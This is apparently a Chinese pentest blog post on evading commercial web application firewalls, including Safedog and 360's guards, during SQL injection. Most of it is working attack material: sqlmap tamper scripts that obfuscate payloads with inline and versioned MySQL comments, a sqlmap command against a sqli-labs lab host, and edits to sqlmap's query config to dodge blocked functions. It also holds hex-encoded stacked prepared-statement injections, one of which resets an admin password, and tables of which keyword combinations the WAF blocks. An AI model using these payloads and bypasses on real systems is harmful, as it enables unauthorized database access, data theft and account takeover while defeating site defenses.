Title: bypass firewall
Category: Pentest
Date: 2017-10-30
slug: bypass-firewall


狗的绕过比较简单，还是写一下：

<https://secvul.com/topics/876.html>
<http://www.freebuf.com/articles/network/150646.html>

根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: `/**a**/`，tamper.py如下：

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**s**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**s**/"
                continue

            retVal += payload[i]

    return retVal
```
米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：
首先是修改tamper:

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s < 5.1" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL < 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
    """

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!50001%s*/ " % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!50001*/", "/*!50001*/")

    return retVal
```

>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句
>
比如mysql版本是5.5.53:

>`select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;`
>
这个语句是可以执行成功的，如果50553变成50554则执行失败

由于主机卫士会拦截cast，修改sqlmap的配置文件:`sqlmap/xml/queries.xml`,先备份，然后修改第6行的内容`<cast query="CAST(%s AS CHAR)"/>`，修改为`<cast query="%s"/>`。

这个时候，在注入的时候需要指定`--technique`为E或者U，盲注在这种情况下是不行的，因为会拦截ord函数。
```
sqlmap.py -u http://192.168.141.200/sqli-labs/Less-1/index.php\?id\=1 --tamper fuck360.py -v 3 --dbs    --union-col 3 --threads 5 --password --technique E --flush-session
```

盲注bypass的尝试:
* 在`sqlmap/txt/keywords.txt`里面添加了`SLEEP`，就是在注入的时候，添加SLEEP为关键词注释掉

因为在注入的时候同样使用了ord函数。
盲注的函数，

```
pow() 计算平方的，对于字母来说貌似结果都一样 pass
pi()
exp() 以e为底的指函数
ceil() 向上取整
sqrt() 给定值的平方根
floor() 向下取整
ceiling() 向上取整
```

被拦截的函数，

```
ascii()
hex()
unhex()
ord()
char()
```

参考<http://www.cnblogs.com/xiaozi/p/7275134.html>这篇文章里面的替换:

```
#!/usr/bin/env python

"""
write by Aaron
"""
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
    pass
def tamper(payload, **kwargs):
    """
    Replaces keywords
    >>> tamper('UNION SELECT id FROM users')
    'union%0a/*!12345select*/id%0a/*!12345from*/users'
    """
    if payload:
        payload=payload.replace(" ALL SELECT ","%0a/*!12345select*/")
        payload=payload.replace("UNION SELECT","union%0a/*!12345select*/")
        payload=payload.replace(" FROM ","%0a/*!12345from*/")
        payload=payload.replace("CONCAT","CONCAT%23%0a")
        payload=payload.replace("CASE ","CASE%23%0a")
        payload=payload.replace("CAST(","/*!12345CASt(*/")
        payload=payload.replace("DATABASE()","database%0a()")
                
    return payload
```
所以只要把ORD函数給注释包含就可以。

网站卫士和主机卫士不同，貌似网站卫士更严格。测试下如何绕过。

主机卫士不是最新版，fucck


###预编译注入
set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;
prepare a from 'select user()';execute a;

一般情况下PDO只会返回第一条SQL语句的结果，一般执行一个update语句，将需要的数据更新到某个可见的字段中，或者使用sleep盲注。


set(@x=757064617465207573657220736574207077643D31313120776865726520757365726E616D653D2761646D696E27);prepare(a)from(@x);execute(a)


set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;
prepare a from 'select user()';execute a;


union select 拦截
select union 不拦截 
select from 拦截
select all 不拦截
updatexml select 拦截


注释:

```
#
-- 
-- -
--+
//
/**/
/*abcd*/
;%00
```
空白字符：

09 0A 0B 0C 0D A0 20

字符串连接函数:
concat
concat_ws

除去GET以外，其他过滤最弱。

```
id=1|@pwd:=(select user from users where 
id=4)/*ddd*/union/*ddd*/select null,@pwd
```

```
union select 拦截
select from 拦截
updatexml select 拦截
select all from 拦截
select distinct from 拦截
select distinctrow from 拦截

select all union 不拦截
select all 不拦截
select union 不拦截 
union from 不拦截

```









